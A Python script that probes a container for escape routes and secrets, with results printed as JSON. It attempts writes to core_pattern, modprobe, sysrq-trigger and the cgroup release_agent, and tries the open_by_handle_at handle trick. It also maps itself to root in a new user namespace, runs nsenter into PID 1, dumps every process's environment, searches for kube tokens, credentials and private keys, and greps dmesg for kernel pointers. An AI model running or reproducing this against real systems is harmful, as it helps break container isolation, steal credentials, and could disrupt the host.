#!/usr/bin/env python3
import ctypes, errno, json, os, pathlib, re, socket, stat, subprocess, time

OUT = {
    'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'hostname': socket.gethostname(), 'uid': os.getuid(), 'gid': os.getgid(),
    'sysctls': {}, 'writes': {}, 'mounts': {}, 'paths': {}, 'handles': {},
    'procs': [], 'commands': {}, 'userns': {}, 'devices': {}
}

def read(path, limit=100000):
    try:
        return pathlib.Path(path).read_bytes()[:limit].decode('utf-8', 'replace')
    except Exception as e:
        return {'error': repr(e)}

def write_test(path, value):
    rec = {'path': path, 'value': value}
    try:
        with open(path, 'w') as f:
            f.write(value)
        rec['ok'] = True
    except Exception as e:
        rec.update(ok=False, error=repr(e), errno=getattr(e, 'errno', None))
    rec['after'] = read(path, 512)
    return rec

def run(name, args, timeout=20):
    try:
        p = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        OUT['commands'][name] = {'rc': p.returncode, 'stdout': p.stdout[:30000], 'stderr': p.stderr[:10000]}
    except Exception as e:
        OUT['commands'][name] = {'error': repr(e)}

for p in ['/proc/self/status', '/proc/1/status', '/proc/self/uid_map', '/proc/self/gid_map',
          '/proc/self/cgroup', '/proc/1/cgroup', '/proc/self/mountinfo', '/proc/1/mountinfo',
          '/proc/sys/kernel/core_pattern', '/proc/sys/kernel/modprobe',
          '/proc/sys/kernel/kptr_restrict', '/proc/sys/kernel/dmesg_restrict',
          '/proc/sys/kernel/unprivileged_userns_clone', '/proc/sys/kernel/unprivileged_bpf_disabled',
          '/proc/sys/kernel/perf_event_paranoid', '/proc/sys/vm/mmap_min_addr',
          '/proc/sysrq-trigger', '/etc/hostname', '/etc/hosts', '/etc/resolv.conf']:
    OUT['sysctls'][p] = read(p, 50000 if 'mountinfo' in p else 4096)

for p in ['/proc/sys/kernel/core_pattern', '/proc/sys/kernel/modprobe', '/proc/sysrq-trigger',
          '/sys/fs/cgroup/systemd/release_agent', '/sys/fs/cgroup/systemd/notify_on_release',
          '/sys/fs/cgroup/systemd/cgroup.procs', '/sys/fs/cgroup/systemd/tasks']:
    OUT['writes'][p] = write_test(p, 'x')

for p in ['/', '/app', '/app/certs', '/tmp/workspace', '/home/worker', '/dev', '/dev/shm',
          '/sys', '/sys/fs/cgroup', '/sys/fs/cgroup/systemd', '/var/run', '/run',
          '/var/lib/kubelet', '/var/lib/containerd', '/run/containerd', '/proc/1/root']:
    try:
        st = os.lstat(p)
        rec = {'mode': oct(stat.S_IMODE(st.st_mode)), 'uid': st.st_uid, 'gid': st.st_gid,
               'size': st.st_size, 'dev': st.st_dev, 'ino': st.st_ino}
        if stat.S_ISDIR(st.st_mode):
            rec['entries'] = sorted(os.listdir(p))[:300]
        elif stat.S_ISREG(st.st_mode):
            rec['text'] = read(p, 20000)
        OUT['paths'][p] = rec
    except Exception as e:
        OUT['paths'][p] = {'error': repr(e)}

for d in ['/dev', '/dev/shm', '/sys/fs/cgroup/systemd', '/sys/module/nf_tables/sections']:
    try:
        OUT['devices'][d] = sorted(os.listdir(d))[:300]
    except Exception as e:
        OUT['devices'][d] = {'error': repr(e)}

for pid in sorted((x for x in os.listdir('/proc') if x.isdigit()), key=int):
    if int(pid) > 5000:
        continue
    rec = {'pid': pid}
    for n in ['cmdline', 'environ', 'status', 'cgroup']:
        try:
            b = pathlib.Path(f'/proc/{pid}/{n}').read_bytes()
            rec[n] = b.replace(b'\0', b' ').decode('utf-8', 'replace')[:30000]
        except Exception as e:
            rec[n] = {'error': repr(e)}
    for n in ['root', 'cwd', 'exe']:
        try:
            rec[n] = os.readlink(f'/proc/{pid}/{n}')
        except Exception as e:
            rec[n] = {'error': repr(e)}
    try:
        rec['fds'] = [(x, os.readlink(f'/proc/{pid}/fd/{x}')) for x in sorted(os.listdir(f'/proc/{pid}/fd'))]
    except Exception as e:
        rec['fds'] = {'error': repr(e)}
    OUT['procs'].append(rec)

# name_to_handle/open_by_handle_at on the container root and host-backed bind mounts.
libc = ctypes.CDLL(None, use_errno=True)
libc.name_to_handle_at.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int), ctypes.c_int]
libc.name_to_handle_at.restype = ctypes.c_int
libc.open_by_handle_at.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.open_by_handle_at.restype = ctypes.c_int
class FH(ctypes.Structure):
    _fields_ = [('handle_bytes', ctypes.c_uint32), ('handle_type', ctypes.c_int32), ('f_handle', ctypes.c_ubyte * 128)]

def err():
    n = ctypes.get_errno()
    return {'errno': n, 'name': errno.errorcode.get(n, str(n)), 'text': os.strerror(n)}

def handle(path):
    fh = FH(); fh.handle_bytes = 128; mid = ctypes.c_int(-1); ctypes.set_errno(0)
    rc = libc.name_to_handle_at(-100, os.fsencode(path), ctypes.byref(fh), ctypes.byref(mid), 0)
    if rc:
        return {'rc': rc, 'error': err()}
    b = bytes(fh.f_handle[:fh.handle_bytes])
    return {'rc': rc, 'mount_id': mid.value, 'handle_type': fh.handle_type,
            'handle_bytes': fh.handle_bytes, 'handle_hex': b.hex()}

for p in ['/', '/tmp/workspace', '/home/worker', '/etc/hosts']:
    h = handle(p); rec = {'name_to_handle': h}
    if h.get('rc') == 0:
        try:
            mfd = os.open(p, os.O_PATH)
            fh = FH(); fh.handle_bytes = h['handle_bytes']; fh.handle_type = h['handle_type']
            for i, x in enumerate(bytes.fromhex(h['handle_hex'])):
                fh.f_handle[i] = x
            ctypes.set_errno(0)
            fd = libc.open_by_handle_at(mfd, ctypes.byref(fh), os.O_RDONLY)
            rec['open_by_handle'] = {'fd': fd, 'error': None if fd >= 0 else err()}
            if fd >= 0:
                try:
                    st = os.fstat(fd); rec['open_by_handle']['stat'] = {'mode': oct(st.st_mode), 'uid': st.st_uid, 'gid': st.st_gid, 'size': st.st_size, 'ino': st.st_ino}
                    if stat.S_ISREG(st.st_mode): rec['open_by_handle']['text'] = os.read(fd, 20000).decode('utf-8', 'replace')
                    elif stat.S_ISDIR(st.st_mode): rec['open_by_handle']['entries'] = sorted(os.listdir(fd))[:300]
                finally:
                    os.close(fd)
            os.close(mfd)
        except Exception as e:
            rec['open_by_handle'] = {'error': repr(e)}
    OUT['handles'][p] = rec

# User namespace + mount namespace behavior.
try:
    uid, gid = os.getuid(), os.getgid()
    os.unshare(os.CLONE_NEWUSER)
    pathlib.Path('/proc/self/setgroups').write_text('deny')
    pathlib.Path('/proc/self/uid_map').write_text(f'0 {uid} 1\n')
    pathlib.Path('/proc/self/gid_map').write_text(f'0 {gid} 1\n')
    os.setresgid(0, 0, 0); os.setresuid(0, 0, 0)
    OUT['userns']['identity'] = {'uid': os.getuid(), 'gid': os.getgid()}
    OUT['userns']['status'] = read('/proc/self/status', 30000)
    os.makedirs('/tmp/nsprobe', exist_ok=True)
    os.unshare(os.CLONE_NEWNS)
    OUT['userns']['new_mountns'] = True
    libc.mount.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_ulong, ctypes.c_char_p]
    tests = [
        ('tmpfs', 'tmpfs', '/tmp/nsprobe', b'size=1m'),
        ('proc', 'proc', '/tmp/nsprobe', None),
        ('cgroup', 'cgroup', '/tmp/nsprobe', None),
    ]
    for name, fstype, target, data in tests:
        ctypes.set_errno(0)
        rc = libc.mount(fstype.encode(), target.encode(), fstype.encode(), 0, data)
        OUT['userns'][name] = {'rc': rc, 'error': None if rc == 0 else err()}
    OUT['userns']['mounts_after'] = read('/proc/self/mountinfo', 100000)
except Exception as e:
    OUT['userns']['error'] = repr(e)

run('id', ['id'])
run('uname', ['uname', '-a'])
run('capsh', ['sh', '-c', 'command -v capsh && capsh --print || true'])
run('nsenter', ['sh', '-c', 'nsenter -t 1 -m -u -i -n -p id 2>&1 || true'])
run('find_kube', ['sh', '-c', 'find /home /tmp /run /var/run /var/lib /etc /opt /app -maxdepth 5 -type f \\( -iname "*kube*" -o -iname "*service*account*" -o -iname "*token*" -o -iname "*credential*" -o -iname "*.pem" -o -iname "*.key" \\) 2>/dev/null | sort | head -500'])
run('dmesg_ptrs', ['sh', '-c', 'dmesg | grep -Ei "nf_tables|module|vmalloc|Freeing|ffffffff|Call Trace|RIP:" | tail -300'])

print(json.dumps(OUT, sort_keys=True, separators=(',', ':')))
